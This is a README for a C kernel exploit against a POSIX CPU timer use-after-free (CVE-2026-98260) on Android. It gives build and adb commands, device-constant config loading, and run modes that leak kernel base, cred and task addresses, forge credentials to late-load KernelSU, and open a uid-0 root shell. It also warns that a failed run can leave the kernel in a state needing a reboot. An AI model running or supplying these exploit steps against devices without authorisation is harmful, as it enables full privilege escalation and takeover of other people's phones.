# TimerUAF native

Single-file C exploit for CVE-2026-98260 (POSIX CPU timer UAF). The device
constants are **not** compiled in; they are loaded at runtime from a HOCON
conf file (`../conf/*.conf`).

## Build

```sh
ANDROID_NDK_HOME=/path/to/ndk make -C native
```

Produces `native/timer` (aarch64 static).

## Run

```sh
adb push native/timer /data/local/tmp/timer
adb push conf/<device>.conf /data/local/tmp/timer.conf
adb shell chmod 755 /data/local/tmp/timer

adb shell 'echo 8192 > /sys/kernel/tracing/buffer_size_kb'

adb shell /data/local/tmp/timer --conf /data/local/tmp/timer.conf ids     # discover trace ids (safe)
adb shell /data/local/tmp/timer --conf /data/local/tmp/timer.conf leak    # leak base/cred/task (safe)
adb shell /data/local/tmp/timer --conf /data/local/tmp/timer.conf fake    # fake cred + KernelSU late-load (UAF)
adb shell /data/local/tmp/timer --conf /data/local/tmp/timer.conf shell   # uid-0 shell via real-cred zero write (UAF)
```

`fake` on failure parks holding a zombie / the fake cred page; **do not kill
it** — a full reboot is the only safe cleanup.

## Conf format

HOCON (JSON is a subset), one `key = value` per line, `#` / `//` comments.
The device-specific fields are documented in `../conf/` and the field list
matches `struct timer_cfg` in `timer.c`.
